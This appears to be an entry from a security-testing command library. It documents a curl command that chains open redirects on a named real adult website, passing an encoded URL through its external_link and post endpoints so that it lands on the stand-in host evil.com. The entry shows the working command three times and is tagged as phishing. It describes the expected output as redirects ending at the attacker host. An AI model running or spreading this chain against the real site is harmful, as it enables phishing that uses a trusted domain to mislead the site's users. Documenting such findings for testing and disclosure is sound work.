---
data: >-
  curl -i
  "https://chaturbate.com/external_link/?url=https%3A%2F%2Fsecure.chaturbate.com%2Fpost%3Fprejoin_data%3Ddomain%252Fevil.com%2F%3F%3D%26weg_digest%3Deacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
tags:
  - web
  - redirect
  - chaining
  - phishing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:27.162Z'
id: 2bf5dca6-8410-40ef-8838-3ddb5669d823
verified: false
validated: true
submitted: true
---
# curl-chain-external-link-redirect

## Command

```bash
curl -i "https://chaturbate.com/external_link/?url=https%3A%2F%2Fsecure.chaturbate.com%2Fpost%3Fprejoin_data%3Ddomain%252Fevil.com%2F%3F%3D%26weg_digest%3Deacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

## Description

Executes a chained request by passing the encoded vulnerable /post URL to /external_link, testing the full phishing redirect flow.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include headers | Yes |
| `URL` | external_link with encoded vulnerable URL | Yes |

## Examples

### Basic Usage

```bash
curl -i "https://chaturbate.com/external_link/?url=https%3A%2F%2Fsecure.chaturbate.com%2Fpost%3Fprejoin_data%3Ddomain%252Fevil.com%2F%3F%3D%26weg_digest%3Deacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

### Advanced Usage (Follow Chain)

```bash
curl -i -L "https://chaturbate.com/external_link/?url=https%3A%2F%2Fsecure.chaturbate.com%2Fpost%3Fprejoin_data%3Ddomain%252Fevil.com%2F%3F%3D%26weg_digest%3Deacde2b0b10379e9848390da67ed883666fe083a9ad892fae85c590ddd354e8c"
```

## Expected Output

Multiple 3xx redirects culminating in response from evil.com, validating the chain.

## Related

- [[Related Procedure: Chain-Open-Redirect-with-chaturbate-external-link]]
